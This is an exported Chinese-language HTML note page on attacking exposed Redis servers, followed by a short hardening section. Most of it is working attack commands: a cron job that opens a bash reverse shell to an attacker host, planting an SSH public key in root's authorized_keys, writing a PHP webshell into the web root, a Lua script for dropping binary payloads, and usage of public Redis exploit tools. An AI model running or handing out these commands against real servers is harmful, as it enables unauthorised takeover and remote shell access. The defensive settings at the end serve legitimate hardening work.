<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs1C2E50E7{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="redis总结"><span class="csDE05BCC">redis</span><span class="csECDA2D3">总结</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">redis</span><span class="cs9C1B1871">总结</span></p><h2 class="cs868C439D">
			<a name="二、影响范围"><span class="cs83F14626">二、影响范围</span></a></h2>
		<h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h4 class="cs868C439D">
			<a name="攻击的几种方法"><span class="cs6EDCDAE2">攻击的几种方法</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">参考</span><span class="cs8926E06">:<br/><a class="cs508254C" href="http://www.cnblogs.com/xiaozi/p/7568272.html"><span class="cs4B51D5E4">http://www.cnblogs.com/xiaozi/p/7568272.html</span></a></span><span class="cs8926E06"><br/><a class="cs508254C" href="https://evi1cg.me/archives/hackredis.html"><span class="cs4B51D5E4">https://evi1cg.me/archives/hackredis.html</span></a></span></p><h5 class="cs868C439D">
			<a name="Xee5120a91ba6db12bb4e0f4300a692c354c454b"><span class="cs4B51D5E4">(1).</span><span class="cs1C2E50E7">利用计划任务执行命令反弹</span><span class="cs4B51D5E4">shell</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06">redis</span><span class="cs9C1B1871">以</span><span class="cs8926E06">root</span><span class="cs9C1B1871">权限运行时可以写</span><span class="cs8926E06">crontab</span><span class="cs9C1B1871">来执行命令反弹</span><span class="cs8926E06">shell</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">先在自己的服务器上监听一个端口</span></p><p class="cs40DD2BC9"><span class="cs8926E06">nc -lvnp 7999</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后执行命令</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">root@kali:~## redis-cli -h 192.168.63.130</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;192.168.63.130:6379&gt; set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;192.168.63.130:6379&gt; config set dir /var/spool/cron/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;192.168.63.130:6379&gt; config set dbfilename root</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;192.168.63.130:6379&gt; save</span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">ps:</span><span class="csE3F655E4">此处使用</span><span class="cs5BEC2C28">bash</span><span class="csE3F655E4">反弹</span><span class="cs5BEC2C28">shell</span><span class="csE3F655E4">，也可使用其他方法</span></p><h5 class="cs868C439D">
			<a name="X2db75171eba25da61064727db5e48c49a1cf133"><span class="cs4B51D5E4">(2).</span><span class="cs1C2E50E7">写</span><span class="cs4B51D5E4">ssh-keygen</span><span class="cs1C2E50E7">公钥然后使用私钥登陆</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在以下条件下，可以利用此方法</span></p><p class="cs40DD2BC9"><span class="cs8926E06">1</span><span class="cs9C1B1871">、</span><span class="cs8926E06">Redis</span><span class="cs9C1B1871">服务使用</span><span class="cs8926E06">ROOT</span><span class="cs9C1B1871">账号启动</span></p><p class="cs40DD2BC9"><span class="cs8926E06">2</span><span class="cs9C1B1871">、服务器开放了</span><span class="cs8926E06">SSH</span><span class="cs9C1B1871">服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">首先在本地生成一对密钥：</span></p><p class="cs3A447A38"><span class="cs9FB05234">root@kali:~/.ssh## ssh-keygen -t rsa</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后</span><span class="cs8926E06">redis</span><span class="cs9C1B1871">执行命令：</span></p><p class="cs3A447A38"><span class="cs9FB05234">ssh-keygen -t rsa</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">cat foo.txt | redis-cli -h x.x.x.x -x set crackit</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">redis-cli -h x.x.x.x</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&gt; config set dir /root/.ssh/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&gt; config get dir</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&gt; config set dbfilename &quot;authorized_keys&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&gt; save</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">ssh -i id_rsa root@x.x.x.x</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">或者如下</span></p><p class="cs3A447A38"><span class="cs9FB05234">192.168.63.130:6379&gt; config set dir /root/.ssh/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">192.168.63.130:6379&gt; config set dbfilename authorized_keys</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">192.168.63.130:6379&gt; set x &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\n\n\n&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">192.168.63.130:6379&gt; save</span></p><h5 class="cs868C439D">
			<a name="Xf66abb884c98f7a7b68a9b15baeeaea04dbff66"><span class="cs4B51D5E4">(3).</span><span class="cs1C2E50E7">往</span><span class="cs4B51D5E4">web</span><span class="cs1C2E50E7">物理路径写</span><span class="cs4B51D5E4">webshell</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">当</span><span class="cs8926E06">redis</span><span class="cs9C1B1871">权限不高时，并且服务器开着</span><span class="cs8926E06">web</span><span class="cs9C1B1871">服务，在</span><span class="cs8926E06">redis</span><span class="cs9C1B1871">有</span><span class="cs8926E06">web</span><span class="cs9C1B1871">目录写权限时，可以尝试往</span><span class="cs8926E06">web</span><span class="cs9C1B1871">路径写</span><span class="cs8926E06">webshell</span></p><p class="cs3A447A38"><span class="cs9FB05234">192.168.63.130:6379&gt; config set dir /var/www/html/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;192.168.63.130:6379&gt; config set dbfilename shell.php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;192.168.63.130:6379&gt; set x &quot;&lt;?php phpinfo();?&gt;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;192.168.63.130:6379&gt; save</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">即可将</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">写入</span><span class="cs8926E06">web</span><span class="cs9C1B1871">目录</span><span class="cs8926E06">(web</span><span class="cs9C1B1871">目录根据实际情况</span></p><h5 class="cs868C439D">
			<a name="X50a3acf50616863877d30ec45921b17a9fbc709"><span class="cs4B51D5E4">(4).</span><span class="cs1C2E50E7">写二进制文件，利用</span><span class="cs4B51D5E4">dns</span><span class="cs1C2E50E7">、</span><span class="cs4B51D5E4">icmp</span><span class="cs1C2E50E7">等协议上线（</span><span class="cs4B51D5E4">tcp</span><span class="cs1C2E50E7">协议不能出网）</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs8926E06">From:<a class="cs508254C" href="http://www.00theway.org/2017/03/27/redis_exp/"><span class="cs4B51D5E4">http://www.00theway.org/2017/03/27/redis_exp/</span></a></span><span class="cs8926E06"> </span><span class="cs9C1B1871">写二进制文件跟前边有所不同，原因在于使用</span><span class="cs8926E06">RDB</span><span class="cs9C1B1871">方式备份</span><span class="cs8926E06">redis</span><span class="cs9C1B1871">数据库是默认情况下会对文件进行压缩，上传的二进制文件也会被压缩，而且文件前后存在脏数据，因此需要将默认压缩关闭，并且通过计划任务调用</span><span class="cs8926E06">python</span><span class="cs9C1B1871">清洗脏数据。</span></p><p class="cs3A447A38"><span class="cs9FB05234">local function hex2bin(hexstr)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;local str = &quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for i = 1, string.len(hexstr) - 1, 2 do</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;local doublebytestr = string.sub(hexstr, i, i+1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;local n = tonumber(doublebytestr, 16);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if 0 == n then</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str = str .. &#39;\00&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str = str .. string.format(&quot;%c&quot;, n)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;end</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return str</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">end</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">local dir = redis.call(&#39;config&#39;,&#39;get&#39;,&#39;dir&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">redis.call(&#39;config&#39;,&#39;set&#39;,&#39;dir&#39;,&#39;/tmp/&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">local dbfilename = redis.call(&#39;config&#39;,&#39;get&#39;,&#39;dbfilename&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">redis.call(&#39;config&#39;,&#39;set&#39;,&#39;dbfilename&#39;,&#39;t&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">local rdbcompress = redis.call(&#39;config&#39;,&#39;get&#39;,&#39;rdbcompression&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">redis.call(&#39;config&#39;,&#39;set&#39;,&#39;rdbcompression&#39;,&#39;no&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">redis.call(&#39;flushall&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">local data = &#39;1a2b3c4d5e6f1223344556677890aa&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">redis.call(&#39;set&#39;,&#39;data&#39;,hex2bin(&#39;0a7c7c7c&#39;..data..&#39;7c7c7c0a&#39;))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">local rst = {}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">rst[1] = &#39;server default config&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">rst[2] = &#39;dir:&#39;..dir[2]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">rst[3] = &#39;dbfilename:&#39;..dbfilename[2]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">rst[4] = &#39;rdbcompression:&#39;..rdbcompress[2]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">return rst</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">保存以上代码为</span><span class="cs9FB05234">a.lua</span><span class="cs7FFD2630">，变量</span><span class="cs9FB05234">data</span><span class="cs7FFD2630">保存的是程序的</span><span class="cs9FB05234">16</span><span class="cs7FFD2630">进制编码，执行</span></p><p class="cs3A447A38"><span class="cs9FB05234">redis-cli --eval a.lua -h *.*.*.*</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">由于</span><span class="cs8926E06">redis</span><span class="cs9C1B1871">不支持在</span><span class="cs8926E06">lua</span><span class="cs9C1B1871">中调用</span><span class="cs8926E06">save</span><span class="cs9C1B1871">因此需要手动执行</span><span class="cs8926E06">save</span><span class="cs9C1B1871">操作</span><span class="cs8926E06">,</span><span class="cs9C1B1871">并且删除</span><span class="cs8926E06">key data</span><span class="cs9C1B1871">，恢复</span><span class="cs8926E06">dir</span><span class="cs9C1B1871">等。</span></p><p class="cs3A447A38"><span class="cs9FB05234">redis-cli save -h *.*.*.*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">redis-cli config set dir *** -h *.*.*.*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">redis-cli config set dbfilename *** -h *.*.*.*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">redis-cli config set rdbcompression * -h *.*.*.*</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">目前写入的文件前后是存在垃圾数据的，下一步通过写计划任务调用</span><span class="cs8926E06">python</span><span class="cs9C1B1871">或者系统命令提取出二进制文件（写文件之在数据前后加入了</span><span class="cs8926E06"> |||</span><span class="cs9C1B1871">作为提取最终文件的标识）。</span></p><p class="cs3A447A38"><span class="cs9FB05234">*/1 * * * * python -c &#39;open(&quot;/tmp/rst&quot;,&quot;a+&quot;).write(open(&quot;/tmp/t&quot;).read().split(&quot;|||&quot;)[1])&#39;</span></p><p class="cs40DD2BC9"><span class="cs8926E06">/tmp/rst</span><span class="cs9C1B1871">为最终上传的文件。</span></p><h5 class="cs868C439D">
			<a name="X0360e6bd222efcc4a319b47e70bc38992a8e2c9"><span class="cs4B51D5E4">(5).</span><span class="cs1C2E50E7">傻瓜式</span><span class="cs4B51D5E4">python</span><span class="cs1C2E50E7">脚本</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs8926E06">From:<a class="cs508254C" href="https://raw.githubusercontent.com/00theway/redis_exp/master/redis_exp.py"><span class="cs4B51D5E4">https://raw.githubusercontent.com/00theway/redis_exp/master/redis_exp.py</span></a></span></p><p class="cs3A447A38"><span class="cs7FFD2630">执行命令</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">需要</span><span class="cs9FB05234">root</span><span class="cs7FFD2630">权限，每次添加计划任务前先获取服务器时间，然后根据获取的时间设置执行计划任务的时间，确保命令被执行一次，避免多次执行引发服务器异常。</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;python redis_exp.py --host *.*.*.* -c &#39;id&#39;</span><span class="cs8926E06"><br/><br/></span><span class="cs7FFD2630">上传文件</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">上传携带脏数据的文件不需要</span><span class="cs9FB05234">root</span><span class="cs7FFD2630">权限，上传二进制文件需要</span><span class="cs9FB05234">root</span><span class="cs7FFD2630">权限，先上传带有脏数据的文件，在文件前后插入特征字符串，然后添加计划任务截取数据</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;python redis_exp.py --host *.*.*.* -l /data/payload.py -r /tmp/p.py</span><span class="cs8926E06"><br/><br/></span><span class="cs7FFD2630">暴力猜解目录</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">不需要</span><span class="cs9FB05234">root</span><span class="cs7FFD2630">权限，利用</span><span class="cs9FB05234"> config set dir &#39;xx&#39; </span><span class="cs7FFD2630">报错进行目录猜解</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;python redis_exp.py --host *.*.*.* -f p.txt</span><span class="cs8926E06"><br/><br/></span><span class="cs7FFD2630">可以通过</span><span class="cs9FB05234">-p</span><span class="cs7FFD2630">参数更改默认端口，</span><span class="cs9FB05234">-t</span><span class="cs7FFD2630">参数更改等待时间</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Redis/redis%e6%80%bb%e7%bb%93_files/image0.png" width="560" height="129" alt="" style="border-width:0px;" /></span><span class="cs8926E06">&nbsp;<img src="Web安全/Redis/redis%e6%80%bb%e7%bb%93_files/image1.png" width="560" height="377" alt="" style="border-width:0px;" /></span></p><h5 class="cs868C439D">
			<a name="Xb7ebeb7c8fd23e8f9f05ead8137a6fcfe85f0f4"><span class="cs4B51D5E4">(6).</span><span class="cs1C2E50E7">批量验证</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs8926E06">From:<a class="cs508254C" href="https://github.com/Ridter/hackredis"><span class="cs4B51D5E4">https://github.com/Ridter/hackredis</span></a></span></p><h5 class="cs868C439D">
			<a name="X06b08278b32ad9e664ec5d6e8bdb05ffe87217a"><span class="cs4B51D5E4">3.</span><span class="cs1C2E50E7">防护措施</span></a></h5>
		<h6 class="cs868C439D">
			<a name="X1a3b1bf06311575a0f83df2846551294ce7c10f"><span class="cs4B51D5E4">1.</span><span class="cs1C2E50E7">禁止一些高危命令</span></a></h6>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">修改</span><span class="cs8926E06"> redis.conf </span><span class="cs9C1B1871">文件，添加以下内容，来禁用远程修改</span><span class="cs8926E06"> DB </span><span class="cs9C1B1871">文件地址</span></p><p class="cs3A447A38"><span class="cs9FB05234">rename-command FLUSHALL &quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rename-command CONFIG &nbsp;&nbsp;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rename-command EVAL &nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;</span></p><h6 class="cs868C439D">
			<a name="Xa977c88515f172f752b92cc72aa4f035af96b69"><span class="cs4B51D5E4">2.</span><span class="cs1C2E50E7">以低权限运行</span><span class="cs4B51D5E4"> Redis </span><span class="cs1C2E50E7">服务</span></a></h6>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">为</span><span class="cs8926E06"> Redis </span><span class="cs9C1B1871">服务创建单独的用户和家目录，并且配置禁止登陆</span></p><p class="cs3A447A38"><span class="cs9FB05234">$ groupadd -r redis &amp;&amp; useradd -r -g redis redis</span></p><h6 class="cs868C439D">
			<a name="Xab86cc9668c65fc0acfb89d1e836011bec8a7ff"><span class="cs4B51D5E4">3.</span><span class="cs1C2E50E7">为</span><span class="cs4B51D5E4"> Redis </span><span class="cs1C2E50E7">添加密码验证</span></a></h6>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">修改</span><span class="cs8926E06"> redis.conf </span><span class="cs9C1B1871">文件，添加</span></p><p class="cs3A447A38"><span class="cs9FB05234">requirepass mypassword</span></p><h6 class="cs868C439D">
			<a name="X47632ff4ac80f23c9cdfb86b0a7cf8ab919fab3"><span class="cs4B51D5E4">4.</span><span class="cs1C2E50E7">禁止外网访问</span><span class="cs4B51D5E4"> Redis</span></a></h6>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">修改</span><span class="cs8926E06"> redis.conf </span><span class="cs9C1B1871">文件，添加或修改，使得</span><span class="cs8926E06"> Redis </span><span class="cs9C1B1871">服务只在当前主机可用</span></p><p class="cs3A447A38"><span class="cs9FB05234">bind 127.0.0.1</span></p><h6 class="cs868C439D">
			<a name="X786bec7ef75de9480f7e69773d79f88cc8fc642"><span class="cs4B51D5E4">5.</span><span class="cs1C2E50E7">保证</span><span class="cs4B51D5E4"> authorized_keys </span><span class="cs1C2E50E7">文件的安全</span></a></h6>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">为了保证安全，您应该阻止其他用户添加新的公钥。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">将</span><span class="cs8926E06"> authorized_keys </span><span class="cs9C1B1871">的权限设置为对拥有者只读，其他用户没有任何权限：</span></p><p class="cs3A447A38"><span class="cs9FB05234">## chmod 400 ~/.ssh/authorized_keys</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">为保证</span><span class="cs8926E06"> authorized_keys </span><span class="cs9C1B1871">的权限不会被改掉，您还需要设置该文件的</span><span class="cs8926E06"> immutable </span><span class="cs9C1B1871">位权限：</span></p><p class="cs3A447A38"><span class="cs9FB05234">## chattr +i ~/.ssh/authorized_keys</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然而，用户还可以重命名</span><span class="cs8926E06"> ~/.ssh</span><span class="cs9C1B1871">，然后新建新的</span><span class="cs8926E06"> ~/.ssh </span><span class="cs9C1B1871">目录和</span><span class="cs8926E06"> authorized_keys </span><span class="cs9C1B1871">文件。要避免这种情况，需要设置</span><span class="cs8926E06"> ~./ssh </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> immutable </span><span class="cs9C1B1871">位权限：</span></p><p class="cs3A447A38"><span class="cs9FB05234">## chattr +i ~/.ssh</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">注意</span><span class="cs8926E06">: </span><span class="cs9C1B1871">如果需要添加新的公钥，需要移除</span><span class="cs8926E06"> authorized_keys </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> immutable </span><span class="cs9C1B1871">位权限。然后，添加好新的公钥之后，按照上述步骤重新加上</span><span class="cs8926E06"> immutable </span><span class="cs9C1B1871">位权限。</span></p><h6 class="cs868C439D">
			<a name="X81f50c01c93115ab0ccfa56c074c30c4a7302c6"><span class="cs4B51D5E4">6.</span><span class="cs1C2E50E7">修改默认端口</span></a></h6>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">指定</span><span class="cs8926E06">Redis</span><span class="cs9C1B1871">监听端口，默认端口为</span><span class="cs8926E06">6379</span><span class="cs9C1B1871">，作者在自己的一篇博文中解释了为什么选用</span><span class="cs8926E06">6379</span><span class="cs9C1B1871">作为默认端口，因为</span><span class="cs8926E06">6379</span><span class="cs9C1B1871">在手机按键上</span><span class="cs8926E06">MERZ</span><span class="cs9C1B1871">对应的号码，而</span><span class="cs8926E06">MERZ</span><span class="cs9C1B1871">取自意大利歌女</span><span class="cs8926E06">Alessia Merz</span><span class="cs9C1B1871">的名字</span></p><p class="cs3A447A38"><span class="cs9FB05234">## redis-server --port 6380</span></p><h6 class="cs868C439D">
			<a name="X24d1c153844a4165f2b4cfd57a4d83dcf4d4f48"><span class="cs4B51D5E4">7.</span><span class="cs1C2E50E7">防火墙</span></a></h6>
		<p class="cs3A447A38"><span class="cs9FB05234">// accept</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">## iptables -A INPUT -p tcp -s 127.0.0.1 --dport 6379 -j ACCEPT</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">## iptables -A INPUT -p udp -s 127.0.0.1 --dport 6379 -j ACCEPT</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// drop</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">## iptables -I INPUT -p tcp --dport 6379 -j DROP</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">## iptables -I INPUT -p udp --dport 6379 -j DROP</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// </span><span class="cs7FFD2630">保存规则并重启</span><span class="cs9FB05234"> iptables</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">## service iptables save</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">## service iptables restar</span></p></body>
</html>
